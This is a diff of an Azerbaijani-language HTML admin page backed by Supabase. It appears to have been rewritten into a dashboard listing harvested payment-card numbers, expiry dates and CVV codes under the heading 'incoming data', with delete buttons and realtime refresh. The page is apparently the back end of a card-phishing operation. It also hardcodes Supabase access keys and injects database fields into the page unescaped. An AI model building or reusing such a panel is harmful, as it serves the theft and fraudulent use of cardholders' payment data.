@@ -1,134 +1,104 @@
 <!DOCTYPE html>
-<html>
+<html lang="az">
 <head>
-  <meta charset="UTF-8">
-  <title>Premium Admin Panel</title>
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ADMIN PANEL</title>
 
-  <style>
-    body {
-      font-family: Arial;
-      background: #0f172a;
-      color: white;
-      margin: 0;
-      padding: 20px;
-    }
+<style>
+body{
+  font-family:Arial;
+  background:#111;
+  color:white;
+  padding:20px;
+}
 
-    h1 { text-align: center; }
+h2{
+  margin-bottom:20px;
+}
 
-    .stats {
-      display: flex;
-      gap: 15px;
-      margin-bottom: 20px;
-    }
+.card{
+  background:#1e1e1e;
+  padding:15px;
+  margin-bottom:15px;
+  border-radius:12px;
+}
 
-    .card {
-      flex: 1;
-      background: #1e293b;
-      padding: 15px;
-      border-radius: 10px;
-      text-align: center;
-    }
-
-    .messages {
-      background: #1e293b;
-      padding: 15px;
-      border-radius: 10px;
-      max-height: 400px;
-      overflow-y: auto;
-    }
-
-    .message {
-      border-bottom: 1px solid #334155;
-      padding: 10px;
-    }
-
-    .new {
-      background: #1d4ed8;
-      border-radius: 6px;
-    }
-
-    small { color: #94a3b8; }
-  </style>
+button{
+  margin-top:10px;
+  padding:8px 12px;
+  border:none;
+  border-radius:8px;
+  background:red;
+  color:white;
+  cursor:pointer;
+}
+</style>
 </head>
-
 <body>
 
-<h1>🔥 Premium Admin Panel</h1>
+<h2>Gələn Məlumatlar</h2>
+<div id="list"></div>
 
-<div class="stats">
-  <div class="card">
-    <h2 id="total">0</h2>
-    <p>Ümumi Mesaj</p>
-  </div>
-  <div class="card">
-    <h2 id="today">0</h2>
-    <p>Bugünkü Mesaj</p>
-  </div>
-  <div class="card">
-    <h2 id="lastTime">-</h2>
-    <p>Son Mesaj Vaxtı</p>
-  </div>
-</div>
+<script type="module">
+import { createClient } from "https://esm.sh/@supabase/supabase-js@2"
 
-<div class="messages" id="messageList"></div>
+const supabaseUrl = "https://gkrfcoyleewxrxbfdunq.supabase.co"
+const supabaseKey = "sb_publishable_E1QDjV9fAt2IaoI3h7G9Iw_hIiSaAFH"
+const supabase = createClient(supabaseUrl, supabaseKey)
 
-<script>
-  const { createClient } = supabase;
+const list = document.getElementById("list")
 
-  const supabaseClient = createClient(
-    "https://gkrfcoyleewxrxbfdunq.supabase.co",
-    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdrcmZjb3lsZWV3eHJ4YmZkdW5xIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzEwMjE0NjMsImV4cCI6MjA4NjU5NzQ2M30.vDwDTIIjk69GJgdK9zhtUe-_h-MYCy4C7qehMl-QMJY"
-  );
+async function loadData(){
+  list.innerHTML="Yüklənir..."
 
-  async function loadMessages() {
-    const { data, error } = await supabaseClient
-      .from("mesajlar")
-      .select("*")
-      .order("created_at", { ascending: false });
+  const { data, error } = await supabase
+    .from("mesajlar")
+    .select("*")
+    .order("id",{ascending:false})
 
-    if (error) {
-      console.error("Xəta:", error.message);
-      return;
-    }
-
-    const list = document.getElementById("messageList");
-    list.innerHTML = "";
-
-    document.getElementById("total").innerText = data.length;
-
-    const todayDate = new Date().toDateString();
-    const todayCount = data.filter(msg =>
-      new Date(msg.created_at).toDateString() === todayDate
-    ).length;
-
-    document.getElementById("today").innerText = todayCount;
-
-    if (data.length > 0) {
-      document.getElementById("lastTime").innerText =
-        new Date(data[0].created_at).toLocaleString("az-AZ");
-    }
-
-    data.forEach((msg, index) => {
-      const div = document.createElement("div");
-      div.className = "message";
-
-      if (index === 0) {
-        div.classList.add("new");
-      }
-
-      div.innerHTML = `
-        <strong>${msg.name || "Ad yoxdur"}</strong><br>
-        ${msg.message || ""}<br>
-        <small>${new Date(msg.created_at).toLocaleString("az-AZ")}</small>
-      `;
-
-      list.appendChild(div);
-    });
+  if(error){
+    list.innerHTML="Xəta: "+error.message
+    return
   }
 
-  loadMessages();
-  setInterval(loadMessages, 3000);
+  list.innerHTML=""
+
+  data.forEach(item=>{
+    const div=document.createElement("div")
+    div.className="card"
+
+    div.innerHTML=`
+      <b>Kart:</b> ${item.kod1}<br>
+      <b>Tarix:</b> ${item.kod2}<br>
+      <b>CVV:</b> ${item.kod3}<br>
+      <button onclick="deleteItem(${item.id})">Sil</button>
+    `
+
+    list.appendChild(div)
+  })
+}
+
+window.deleteItem = async function(id){
+  await supabase
+    .from("mesajlar")
+    .delete()
+    .eq("id",id)
+
+  loadData()
+}
+
+loadData()
+
+// realtime
+supabase
+  .channel('realtime')
+  .on('postgres_changes',
+    { event: '*', schema: 'public', table: 'mesajlar' },
+    () => loadData()
+  )
+  .subscribe()
+
 </script>
 
 </body>
